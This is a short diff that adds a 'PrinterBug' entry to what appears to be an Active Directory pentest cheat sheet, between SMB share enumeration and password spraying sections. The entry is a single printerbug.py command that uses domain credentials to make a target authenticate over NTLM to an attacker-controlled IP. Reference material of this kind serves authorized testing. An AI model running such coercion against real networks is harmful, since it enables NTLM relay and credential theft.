@@ -541,6 +541,15 @@ NetExec smb <Domain_Controller_IP> -u 'a' -p '' --shares
   ```
 </details> 
 
+<details>
+  <summary> PrinterBug </summary> 
+  
+  ### Force NTLM authentication
+  ```shell
+  python3 printerbug.py '<Domain_Name>'/'<AD_user>':'<AD_password>'@'<target_IP>' <attacker_IP> 
+  ```
+</details>
+
 # Password Spraying
 
 <details>
